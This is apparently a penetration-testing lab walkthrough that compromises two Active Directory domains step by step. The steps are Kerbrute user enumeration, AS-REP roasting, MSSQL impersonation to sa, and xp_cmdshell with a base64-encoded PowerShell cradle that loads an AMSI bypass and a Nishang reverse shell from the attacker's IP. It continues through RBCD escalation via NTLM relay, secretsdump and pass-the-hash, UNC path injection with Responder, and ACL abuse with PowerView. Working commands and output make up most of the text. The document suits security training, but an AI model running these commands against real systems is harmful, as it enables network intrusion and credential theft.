# Manual

## Attack path visualized

![](<../../../.gitbook/assets/image (68) (1).png>)

### 1. Enumerate Users

**Task: Enumerate valid domain users.**

It is possible to enumerate valid domain users by sending TGT requests with the usernames to the domain controller and checking the response. One tool which can do this is [Kerbrute](https://github.com/ropnop/kerbrute). But first we need a list of usernames to spray. A repository with a lot of lists for ethica hacking is [SecLists](https://github.com/danielmiessler/SecLists).

1. Download Kerbrute, make it executable and download SecLists:

```
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
chmod +x kerbrute
git clone https://github.com/danielmiessler/SecLists
```

2\. After downloading the tools and the username list, run Kerbrute against the domain `amsterdam.bank.local` and DC `10.0.0.3`. I prefer to pipe the command to `tee` to save the output to a text file, in this case `username_enum.txt`. The command is:

```
./kerbrute userenum -d amsterdam.bank.local --dc 10.0.0.3 /opt/SecLists/Usernames/xato-net-10-million-usernames.txt | tee username_enum.txt
```

![](<../../../.gitbook/assets/image (72) (1) (1) (1).png>)

3\. Kerbrute found quite some valid usernames. To only get a list of usernames execute the following command which will cut the output and only print the usernames. Then it changes everything to lowercase and sort for unique entries and write it to `users.txt`:

```
cat username_enum.txt | grep bank.local | cut -d " " -f 8- | cut -d "@" -f 1 | sed 's/./\L&/g' | sort -u > users.txt
```

```
cat users.txt   
                                                                                                    
administrator
bank
bob
chris
dave
david
john
mark
mike
richard
robert
steve
thomas
```

We succesfully enumerated a list of valid domain users that are part of the domain `amsterdam.bank.local`.

### 2. AS-REP roast

**Task: Check if any of the valid users are vulnerable to an kerberos vulnerability.**

One of the misconfiguration which can be exploited with just a list of valid domain users and without knowing their password is checking if any of the valid domain users has pre-authentication enabled. If they do we can execute the AS-REP roasting attack and hopefully crack their hash and retrieve a valid password.

Other attacks which are possible to do is password spraying or checking if the user has an empty password. Which won't be covered in this attack path. But its possible to gain access to other users by executing these kind of attacks.

1. We can use the [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) script from Impacket to check if any of the users has this attribute set and if they do AS-REP roast them, saving the hashes to `asreproasting.txt`.

```
GetNPUsers.py amsterdam/ -dc-ip 10.0.0.3 -usersfile users.txt -format hashcat -outputfile asreproasting.txt
```

![](<../../../.gitbook/assets/image (9) (1) (1).png>)

2\. The output doesn't show us any successes. But the file `kerberoasting.txt` is there and it has a hash for the user `richard`:

![](<../../../.gitbook/assets/image (67) (1).png>)

3\. We can try to crack this hash using [Hashcat](https://hashcat.net/hashcat/). I transferred the file to my host since cracking in a VM isn't really ideal since it doesn't have access to my GPU. I always run Hashcat with rockyou and the dive ruleset first. For AS-REP Roasting we need to use hashmode `-m 18200`.

```
.\hashcat.exe -a 0 -m 18200 .\asreproasting.txt .\wordlists\rockyou.txt  -r .\rules\dive.rule
```

![](<../../../.gitbook/assets/image (34) (1) (1).png>)

4\. We cracked the hash within seconds of the domain user `Richard`, the password is `Sample123`.

#### Optional gathering BloodHound data of amsterdam.bank.local:

1. After gaining access to a valid set of credentials I always prefer to run [BloodHound](https://github.com/BloodHoundAD/BloodHound) immediately. I normally run the PowerShell version of the BloodHound ingestor, but since we don't have access to a machine yet and I'm not connected on my W10 VM to the lab. We can run the [BloodHound.py](https://github.com/fox-it/BloodHound.py) ingestor from FoxIt:

```
git clone https://github.com/fox-it/BloodHound.py
bloodhound-python -d amsterdam.bank.local -ns 10.0.0.3 -dc DC02.amsterdam.bank.local -u 'Richard' -p 'Sample123' --zip -c all
```

![](<../../../.gitbook/assets/image (2) (1).png>)

2\. We now can load the data into BloodHound by dragging the zip file into the BloodHound program and see if `Richard` can do anything useful. In the top search for the Richard user and click on it.

![](<../../../.gitbook/assets/image (62) (1) (1).png>)

If you check Richard their attributes and click on the group memberships it unfolds. Richard is member of the following groups, nothing interesting there:

![](<../../../.gitbook/assets/image (66) (1) (1).png>)

The attributes of the user also doesn't show anything interesting:

![](<../../../.gitbook/assets/image (15) (1) (1) (1).png>)

We didn't found anything, but it is always good to check this for every user and computers you own. You can also right click on every object we owned and mark them as "Owned". So its easier to query future attack paths from owned principals.

### 3. Access SQL Server

**Task: Check if the user can access any system or service.**

#### Checking for access

To check if a user can access any systems I prefer to use [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec). This tool can easily check if the user can authenticate to a list of targets using either the protocols smb, winrm, mssql or ldap. It also supports ssh. This is a snippet from the help function:

![](<../../../.gitbook/assets/image (47) (1).png>)

1. We can check if the user can access anything over SMB, which by default a normal domain user can authenticate over SMB. If the user is local admin (which is what we need to really do anything over SMB, it will show `Pwn3d!` in orange).

```
crackmapexec smb 10.0.0.0/24 -u richard -p Sample123
```

![](<../../../.gitbook/assets/image (56) (1).png>)

The account can access three hosts over SMB but unfortunately we aren't local admin to any of them. We can still check for any accessible SMB shares by adding the `--shares` parameter.

```
crackmapexec smb 10.0.0.3 10.0.0.4 10.0.0.5 -u richard -p Sample123 --shares
```

![](<../../../.gitbook/assets/image (54).png>)

The IPC$, NETLOGON and SYSVOL shares are default. There is one interesting share with the name `Data` on `FILE01`. After connecting to the share with smbclient we see that this user unfortunately can't access any of the subdirectories:

![](<../../../.gitbook/assets/image (73) (1) (1).png>)

2\. Next we can check if the user can access any systems with the winrm protocol:

```
crackmapexec winrm 10.0.0.0/24 -u richard -p Sample123
```

![](<../../../.gitbook/assets/image (32) (1).png>)

3\. We weren't able to authenticate to any machine over Winrm. Now we check for SQL server with the mssql protocol:

```
crackmapexec mssql 10.0.0.0/24 -u richard -p Sample123
```

![](<../../../.gitbook/assets/image (15) (1) (1).png>)

Richard can connect to the SQL server running on `WEB01` `10.0.0.5`. But he doesn't have sysadmin rights(otherwise the tool prints Pwn3d!).

4\. We can create a real connection with these credentials and the script [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) from Impacket.&#x20;

```
mssqlclient.py -windows-auth 'amsterdam/richard:Sample123'@10.0.0.5
```

![](<../../../.gitbook/assets/image (9) (1).png>)

### 4. Become sysadmin

**Task: Escalate privileges to sysadmin.**

1. With the following SQL query we can check if our user is sysadmin, although we already know from CrackMapExec that our user likely isn't sysadmin

```
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

![](<../../../.gitbook/assets/image (29) (1).png>)

2\. The `0` means that the user `AMSTERDAM\richard` is not sysadmin. So we have to find a way to gain sysadmin privileges. One of the ways I know of is checking if our user can impersonate any other user which we can check with the following SQL query:

```
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
```

![](<../../../.gitbook/assets/image (14) (1) (1) (1).png>)

3\. Seems like we can impersonate a user with the name `Developer`. We can do this with the following SQL query:

```
EXECUTE AS LOGIN = 'Developer'
```

But we get an error, because the user `Developer` can't use the database we are currently connected to:&#x20;

![](<../../../.gitbook/assets/image (45) (1).png>)

We can change the database to master; and try it again:

```
use master;
EXECUTE AS LOGIN = 'Developer'
```

![](<../../../.gitbook/assets/image (39) (1) (1).png>)

Seems like it worked, lets run the query again to check which user we are and if we are sysadmin:

```
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

![](<../../../.gitbook/assets/image (18) (1) (1).png>)

4\. We impersonated the user `Developer` but still aren't sysadmin. We can check for impersonation permissions again with the same query:

```
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
```

![](<../../../.gitbook/assets/image (20) (1).png>)

5\. We can now try to impersonate `sa`, but we get an error:

```
EXECUTE AS LOGIN = 'sa'
```

![](<../../../.gitbook/assets/image (46) (1) (1) (1).png>)

6\. Lets try to impersonate `developer_test` and then check for sysadmin privileges and if impersonation is possible again:

```
EXECUTE AS LOGIN = 'developer_test'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
```

![](<../../../.gitbook/assets/image (36) (1).png>)

7\. We aren't sysadmin but it seems we can finally impersonate `sa` now.

```
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

![](<../../../.gitbook/assets/image (61) (1) (1).png>)

8\. We are `sa` and have sysadmin privileges. We successfully escalated our privileges from domain user to `sa` with sysadmin privileges on the SQL Server. Now we can try to get command execution on the host.

### 5. Execute commands

**Task: Get a shell.**

1. The first step to execute commands is to check if xp\_cmdshell is already enabled, since its only possible to execute cmd commands if that is enabled. We can do that by just executing xp\_cmdshell and see if it works:

```
EXEC master..xp_cmdshell 'whoami'
```

![](<../../../.gitbook/assets/image (11) (1) (1) (1).png>)

2\. We receive an error that it is disabled. But we can try to enable it with the following SQL queries:

```
EXEC sp_configure 'show advanced options',1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE
```

![](<../../../.gitbook/assets/image (10).png>)

Now we can try to execute the `whoami` command again and it worked:

```
EXEC master..xp_cmdshell 'whoami'
```

![](<../../../.gitbook/assets/image (63) (1) (1).png>)

3\. The next step is to gain a reverse shell from `WEB01`. For this we need to prepare some files and setup a listener before we execute a query and command on the sql server.&#x20;

* Save the amsi bypass from [here](https://github.com/0xJs/RedTeaming\_CheatSheet/tree/main/windows-ad#amsi-bypass) to a file named `amsi.txt`.
* Download [Invoke-PowerShellTcp.ps1](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1) from Nishang: `wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1`
* Check the IP of the attacking: `ip a` (mine is 192.168.248.2 but yours will be different!).
* Add the following to a newline in Invoke-PowerShellTcp.ps1: `Invoke-PowershellTcp -Reverse -IPAddress <IP> -Port 443`
* Start a webserver on port 8090: `python3 -m http.server 8090`
* Start a listener on port 443: `nc -lvp 443`

![](<../../../.gitbook/assets/image (35) (1).png>)

4\. Now we need to change/type the payload we want to execute on the SQL server. A method I learned to use is to base64 encode the command we want to execute and use the `-enc` parameter inside PowerShell. This prevents a lot of issues with single and double quotes.

* The payload we would like to execute which will download the amsi into memory and then execute the reverse shell after bypassing Windows Defenser amsi is:

```
IEX ((new-object net.webclient).downloadstring("http://192.168.248.2:8090/amsi.txt")); IEX ((new-object net.webclient).downloadstring("http://192.168.248.2:8090/Invoke-PowerShellTcp.ps1"));
```

* We can save this payload into a variable with the following command and then base64 encode it with the second command:

```
$str = 'IEX ((new-object net.webclient).downloadstring("http://192.168.248.2:8090/amsi.txt")); IEX ((new-object net.webclient).downloadstring("http://192.168.248.2:8090/Invoke-PowerShellTcp.ps1"));'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
```

![](<../../../.gitbook/assets/image (71) (1) (1) (1).png>)

* Now we can paste the base64 encoded string in the following SQL query which will execute the base64 encoded PowerShell command:

```
EXEC xp_cmdshell 'powershell.exe -w hidden -enc <BASE64 STRING>';

EXEC xp_cmdshell 'powershell.exe -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAGEAbQBzAGkALgB0AHgAdAAiACkAKQA7ACAASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQApADsA'
```

5\. Now its time to execute the command and receive a shell. Amsi.txt and the reverse shell gets downloaded from the webserver and the shell comes in from `WEB01` as `NT service\mssql$dev`:

![](<../../../.gitbook/assets/image (16) (1) (1) (1).png>)

### 6. Privesc RBCD

**Task: Escalate privileges on the machine with a delegation attack.**

One of the privilege escalation techniques that you don't see too often is by using a Resource Based Constrained Delegation attack. This attack works by relaying the computerhash to ldap after forcing a webdav authentication to the attacker machine. To do the attack there are a few requirements which are:

* A low privileged shell on a machine
* An account with a SPN associated (or able to add new machines accounts (default value this quota is 10))
* WebDAV redirector feature must be installed on the victim machine. (W10 has it by default, but manually installed on server 2016 and later)
* A DNS record pointing to the attacker’s machine (By default authenticated users can do this).

1. The first requirement we already have, so lets check if the authenticated users group can add computers to the domain. We can check this with Crackmapexec:

```
crackmapexec ldap 10.0.0.3 -u richard -p Sample123 -M MAQ
```

![](<../../../.gitbook/assets/image (71) (1) (1).png>)

2\. The `MachineAccountQouta` is 10, meaning we (all authenticated users) can create our own computerobjects in the domain. So lets add our own computerobject, this can be done with [PowerMad](https://github.com/Kevin-Robertson/Powermad). First we have to download it on our attacking machine, in the same directory as our Webserver is already running:

```
wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1
```

Now we can load it into the PowerShell session in the shell:

```
iex (iwr http://192.168.248.2:8090/Powermad.ps1 -usebasicparsing)
```

![](<../../../.gitbook/assets/image (24) (1).png>)

Then we can create our own computerobject with the name `FAKE01` and password `123456` using the `New-MachineAccount` cmdlet from PowerMad:

```
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

![](<../../../.gitbook/assets/image (73) (1).png>)

3\. The third requirement is that the WebDav director is installed. We can check this with the following PowerShell command in the shell:

```
Get-WindowsFeature WebDAV-Redirector
```

![](<../../../.gitbook/assets/image (14) (1) (1).png>)

The WebDAV Redirector is installed.

4\. The last requirement is to create a DNS record back to our attacking machine, since the webdav connection won't work without a hostname to connect too. For this we need the [Invoke-DNSUpdate](https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Invoke-DNSUpdate.ps1) script from PowerMad. So we download it again and import it in the shell and then run the command to add the dns entry `webdav.amsterdam.bank.local` to our attacking machine IP (`192.168.248.2`):

```
#Download on kali
wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Invoke-DNSUpdate.ps1

#Execute in the shell on web01
iex (iwr http://192.168.248.2:8090/Invoke-DNSUpdate.ps1 -usebasicparsing)
Invoke-DNSUpdate -DNSType A -DNSName webdav.amsterdam.bank.local -DNSData 192.168.248.2 -Realm amsterdam.bank.local
```

![](<../../../.gitbook/assets/image (11) (1) (1).png>)

I also did a nslookup to check if the DNS record was created. The domain controller at `10.0.0.3` responded and gave us the correct attacker IP. We now have all our prerequisites. Time to escalate our privileges.

5\. Run [NTLMRelay](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) from impacket on our Kali machine and set it up so it will write the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute that allows our created computerobject `FAKE01` to actonbehalf `WEB01`:

```
python3 /opt/impacket/examples/ntlmrelayx.py -t ldap://10.0.0.3 --delegate-access --escalate-user FAKE01$ --serve-image ./image.jpg
```

![](<../../../.gitbook/assets/image (5) (1) (1).png>)

6\. Next we need to download en load the [Change-LockScreen.ps1](https://github.com/nccgroup/Change-Lockscreen) script from the NCCgroup and load it into memory on the target:

```
wget https://raw.githubusercontent.com/nccgroup/Change-Lockscreen/masterChange-Lockscreen.ps1
iex (iwr http://192.168.248.2:8090/Change-Lockscreen.ps1 -usebasicparsing)
```

Now its time to execute the attack. A quick recap from one of our pages:

> Abuse the lockscreen image changing functionality to achieve a webdav network authentication as SYSTEM from the given computer. Then relay the authentication to the Active Directory LDAP service in order to set up Resource-Based Constrained Delegation to that specific machine.

Lets force the webdav request back to our kali attacking machine:

```
change-lockscreen -webdav \\webdav@80\
```

![](<../../../.gitbook/assets/image (74) (1).png>)

Once we check our NTLMRelay tool output we see that it succesfully authenticated as `WEB01$` to the LDAP port on the DC at `10.0.0.3`. And it says `FAKE01` can now impersonate users on `WEB01`.

7\. The next step is to impersonate a user(preferably a domain admin) and request service tickets so we can authenticate to the host. We can create a CIFS service ticket using `FAKE01` impersonating the domain admin `Administrator` using impackets [getST.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) script. Fill in the password `123456`.

```
getST.py amsterdam/FAKE01@10.0.0.5 -spn cifs/web01.amsterdam.bank.local -impersonate administrator -dc-ip 10.0.0.3
```

![](<../../../.gitbook/assets/image (33).png>)

8\. Now we can use the ticket and authenticate with tools that support these, most (if not all) Impacket tools support this. So we can run [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to retrieve the local useraccount hashes.

```
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass web01.amsterdam.bank.local
```

![](<../../../.gitbook/assets/image (1) (1).png>)

We retrieved the hash of the local `administrator` user and the cached hashes for two domain admins. These look like NTLM hashes but aren't. We can use the local admin hash though to authenticate to `WEB01`. We can do this with our good old tool `CrackMapExec`.

9\. The next step is to execute commands and get a shell. You might wonder why don't you just use psexec.py from Impacket, well because Defender will block it:

![](<../../../.gitbook/assets/image (37) (1).png>)

As said before, we can use the local administrator hash with CrackMapExec and execute commands with the `-x` flag.

```
crackmapexec smb 10.0.0.5 -u administrator -H a59cc2e81b2835c6b402634e584a8edc --local-auth -x whoami
```

![](<../../../.gitbook/assets/image (72) (1).png>)

That worked, but how can we get a shell? You remember the payload we generated to get a shell through SQL server. That will work here too. So lets copy that and place it in the x parameter after starting a listener again to receive the shell:

```
nc -lvp 443
crackmapexec smb 10.0.0.5 -u administrator -H a59cc2e81b2835c6b402634e584a8edc --local-auth -x 'powershell.exe -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAGEAbQBzAGkALgB0AHgAdAAiACkAKQA7ACAASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQApADsA'
```

![](<../../../.gitbook/assets/image (55) (1) (1).png>)

And we received a shell as the local administrator. Gotta love PowerShell :)

### 7. Abuse SQL Link

**Task: Enumerate SQL Links to hop across trusts.**

1. We now fully own the server `web01` which runs as a SQL Server. During our enumeration we didn't check for any SQL Links. We could do this manually in our connected mssqlclient.py session, but we could also use HeidiSQL from our Windows 10 machine. You might wonder why, but I prefer to use Heidisql, especially with bigger queries and data returned. mssqlclient.py for example returns big tables like this on my fullscreen monitor, its unreadable:

![](<../../../.gitbook/assets/image (70) (1).png>)

To do this we need to setup a port forward since our Windows 10 machine isn't connected to the lab. We can do this with [Socat](https://github.com/3ndG4me/socat). This will make our kali listen on port `1433` and redirect all traffic to `WEB01` (`10.0.0.5`) port `1433`. The SQL Server is running on default on port 1433.

```
socat tcp-l:1433,fork tcp:10.0.0.5:1433
```

{% hint style="info" %}
You can also do this to connect with the native windows Remote Desktop client instead of rdesktop or any linux remote desktop tool. I really prefer doing it that way.
{% endhint %}

On our Windows 10 machine we need to start [HeidiSQL](https://www.heidisql.com/) with a runas command to be able to authenticate with the domain user `Richard` his credentials. When prompted for the password enter `Sample123`.

```
runas /netonly /user:amsterdam\richard c:\Tools\AD\HeidiSQL_11.3_64_Portable\heidisql.exe
```

Then we can connect to the database using the following settings:

![](<../../../.gitbook/assets/image (68).png>)

{% hint style="info" %}
For this to work you will need to fill in the IP of your kali machine, which need to be in the same network as the Windows 10 machine.
{% endhint %}

2\. In HeidiSQL click on the "Query" tab and execute the following query to enumerate SQL links:

```
SELECT * FROM master..sysservers;
```

![](<../../../.gitbook/assets/image (71) (1).png>)

3\. There is one SQL link to a sql server on `data01.secure.local`. We can try to query the linked server for the SQL server version with the following query, using the openquery functionality:

```
SELECT * FROM OPENQUERY("DATA01.SECURE.LOCAL", 'select @@version');
```

![](<../../../.gitbook/assets/image (61) (1).png>)

4\. We can also query the server to check if xp\_cmdshell is on so we can execute commands:

```
SELECT * FROM OPENQUERY("DATA01.SECURE.LOCAL", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');
```

![](<../../../.gitbook/assets/image (56).png>)

Unfortunately it isn't enabled.&#x20;

{% hint style="success" %}
You could try to enable it (and that works too if you configured it in one of the pages). But that isn't the intended way for the attack path and gain access to the machine. Feel free to test it though.
{% endhint %}

### 8. UNC Path injection

**Task: Perform a UNC Path injection and capture the hash of SQL Service user.**

SQL Servers by default runs as a local service under the context of the computeraccount. But it is possible that the SQL service is running as a domain user which is made for the SQL service. For example `sa_sql`. If we are able to capture its NTLMv2 hash we could try to crack it offline

1. Before we can try to capture hashes we should run [Responder](https://github.com/lgandx/Responder) on our attacking machine. Responder will listen on multiple ports such as SMB, SQL, FTP etc. For executing the attack we only need SMB (port 445). We can run Responder with the following command

```
sudo responder -I tun0
```

![](<../../../.gitbook/assets/image (69) (1) (1).png>)

2\. The next step is to perform a UNC Path injection attack. One SQL function we can use for that is `xp_dirtree`. We can try the UNC Path injection with the following query in HeidiSQL, using the EXEC AT method to execute something through the link:

```
EXEC('xp_fileexist ''\\192.168.248.2\pwn''') AT "DATA01.SECURE.LOCAL"
```

![](<../../../.gitbook/assets/image (5) (1).png>)

3\. If we check our Responder output we can see that we captured the hash from the user `sa_sql` from the domain `Secure`.

![](<../../../.gitbook/assets/image (38).png>)

### 9. Crack SQL account hash

**Task: Crack the hash of the SQL service user.**

1. We received a NTLMv2 hash from the `sa_sql` user, which we can try to crack if the password of the user isn't that strong. We can easily do this with Hashcat like we did during the AS-REP roasting. But this time we need another hashmode.

```
.\hashcat.exe -a 0 -m 5600 .\hash.txt .\wordlists\rockyou.txt  -r .\rules\dive.rule
```

![](<../../../.gitbook/assets/image (30).png>)

We successfully cracked the hash of the `sa_sql` user, the password is `Iloveyou2`.

### 10. ACL - Write Owner & RCBCD

**Task: Check for ACL's and get access to the system.**

1. To enumerate ACL abuses I prefer to run BloodHound. We already gathered the information for `amsterdam.bank.local` but the `sa_sql` user is part of a different domain. To use BloodHound we need to know what the domain controller is for this domain. We can enumerate this in a lot of ways, the easiest way is to try to resolve the domain name:

```
nslookup secure.local
```

![](<../../../.gitbook/assets/image (65) (1).png>)

2\. The IP for secure.local is `10.0.0.100`, we can quickly run Crackmapexec and see if we can connect to it over SMB:

```
crackmapexec smb 10.0.0.100
```

![](<../../../.gitbook/assets/image (64).png>)

3\. The hostname is `DC03`, and the machine is part of `secure.local`. We probably found the domain controller. Lets run BloodHound with the gathered credentials to retrieve the domain data:

```
bloodhound-python -d secure.local -ns 10.0.0.100 -dc DC03.secure.local -u 'sa_sql' -p 'Iloveyou2' --zip -c all
```

![](<../../../.gitbook/assets/image (26).png>)

We were able to successfully gather the BloodHound data. We can load it by dragging it into BloodHound like we did earlier. We can also find the `sa_sql` user now:

![](<../../../.gitbook/assets/image (13) (1) (1) (1).png>)

4\. Click on the user and scroll down in the "Node Info" till the "Outbound Control Rights" section. If there is any data here, it means the object has control on another object. Lets click on the number "1".

![](<../../../.gitbook/assets/image (66) (1).png>)

We see that the user has WriteOwner permissions:

![](<../../../.gitbook/assets/image (67).png>)

In BloodHound you can right click the Edge and click the ?Help function to get more information on how to abuse it:

![](<../../../.gitbook/assets/image (13) (1) (1).png>)

5\. One tool to do these ACL abuses is [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) from PowerSploit. So lets download that and load it into memory in the shell we have on `WEB01`.

```
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
iex (iwr http://192.168.248.2:8090/PowerView.ps1 -usebasicparsing)
```

We also need to create a credential object for the `sa_sql` user since we need to execute the commands as that user. We can do that with the following powershell commands:

```
$password = ConvertTo-SecureString 'Iloveyou2' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('secure.local\sa_sql', $password)
```

The credentials are saved in the `$creds` variable now:

![](<../../../.gitbook/assets/image (46) (1) (1).png>)

6\. Now we can use PowerView to query the domain controller from `secure.local` for the domain-object `DATA01` and retrieve the samaccountname and Owner attribute. We will receive a SID which we need to resolve as well;

```
Get-DomainObject -Identity data01 -SecurityMasks Owner -Domain secure.local -Credential $creds -Server 10.0.0.100 | select samaccountname, Owner
Get-DomainObject -Identity S-1-5-21-1498997062-1091976085-892328878-512 -Domain secure.local -Credential $creds -Server 10.0.0.100
```

![](<../../../.gitbook/assets/image (73).png>)

7\. The current owner of `DATA01` is the Domain Admins group. Lets change that. We can change the owner of the object using the `Set-DomainObjectOwner` cmdlet. The command below will change the owner to `sa_sql`.

```
Set-DomainObjectOwner -Domain secure.local -Credential $creds -Server 10.0.0.100 -Identity DATA01 -OwnerIdentity sa_sql -Verbose
```

![](<../../../.gitbook/assets/image (43).png>)

We didn't received any output, but we can execute the commands again to see who the owner is now.

![](<../../../.gitbook/assets/image (19).png>)

The owner successfully changed.

8\. Since we are the owner of the object now we can change the permissions we have on the object. We can give ourself genericall rights. This can be done with PowerView and the cmdlet `Add-DomainObjectAcl`.

```
Add-DomainObjectAcl -Domain secure.local -Credential $creds -TargetDomain secure.local -TargetIdentity DATA01 -PrincipalDomain secure.local -PrincipalIdentity sa_sql -Rights All -Verbose
```

![](<../../../.gitbook/assets/image (16) (1) (1).png>)

9\. We didn't reveive any output but now we can check the current permissions by running BloodHound again and ingesting the data:

![](<../../../.gitbook/assets/image (65).png>)

10\. We have a lot of permissions now. Since `DATA01` doesn't have LAPS installed unfortunately, we need to execute another Resource Based Constrained Delegation attack. The one known as the computer object takeover. To execute this attack there are two requirements:

* An account with a SPN associated (or able to add new machines accounts (default value this quota is 10))
* A user with write privileges over the target computer which doesn't have msds-AllowedToActOnBehalfOfOtherIdentity

11\. The first requirement we already know how to do. So lets do what we did previously. Check for the machine account qouta in the `secure.local` domain.&#x20;

```
crackmapexec ldap 10.0.0.100 -u sa_sql -p Iloveyou2 -M MAQ
```

![](<../../../.gitbook/assets/image (12).png>)

Then create a credential object, load PowerMad and add a computerobject to the domain:

```
$password = ConvertTo-SecureString 'Iloveyou2' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('secure.local\sa_sql', $password)
iex (iwr http://192.168.248.2:8090/Powermad.ps1 -usebasicparsing)
New-MachineAccount -Domain secure.local -Credential $creds -DomainController 10.0.0.100 -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

![](<../../../.gitbook/assets/image (66).png>)

We successfully created the computerobject `FAKE01` in the `secure.local` domain.

12\. The second requirement we already have, we gave `sa_sql` genericall permissions to `DATA01`. But we can check if the `msds-AllowedToActOnBehalfOfOtherIdentity` attribute is empty with PowerView.

```
iex (iwr http://192.168.248.2:8090/PowerView.ps1 -usebasicparsing)
Get-DomainComputer -Domain secure.local -Credential $creds -Server 10.0.0.100 Data01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
```

![](<../../../.gitbook/assets/image (32).png>)

13\. The attribute haven't been set. Before we can write to it, we need to prepare the descriptor. First we need to get the SID of the computerobject `FAKE01` which we created. We can request this with PowerView:

```
Get-DomainComputer fake01 -Domain secure.local -Credential $creds -Server 10.0.0.100 | Select-Object samaccountname, objectsid
```

![](<../../../.gitbook/assets/image (70).png>)

Now we need to create the raw security descriptor which we then will write to the attribute:

```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1498997062-1091976085-892328878-1601)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

![](<../../../.gitbook/assets/image (16) (1).png>)

14\. Now we can write as `sa_sql` to the `msds-allowedtoactonbehalfofotheridentity` attribute of the computerobject `DATA01`:

```
Get-DomainComputer DATA01 -Domain secure.local -Credential $creds -Server 10.0.0.100 | Set-DomainObject -Domain secure.local -Credential $creds -Server 10.0.0.100 -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

![](<../../../.gitbook/assets/image (15) (1).png>)

We didn't get any output since we are in a shell. But we can check the attribute again to see of it worked:

![](<../../../.gitbook/assets/image (75).png>)

Seems like it worked, now we can check the value of the `msds-AllowedToActOnBehalfOfOtherIdentity` attribute by saving it in a variable and doing some PowerShell confu to decrypt it:

```
$RawBytes = Get-DomainComputer DATA01 -Domain secure.local -Credential $creds -Server 10.0.0.100 -Properties 'msds-allowedtoactonbehalfofotheridentity' | Select-Object -ExpandProperty msds-allowedtoactonbehalfofotheridentity
(New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl
Get-DomainComputer -Domain secure.local -Credential $creds -Server 10.0.0.100 S-1-5-21-1498997062-1091976085-892328878-1601 | Select-Object samaccountname
```

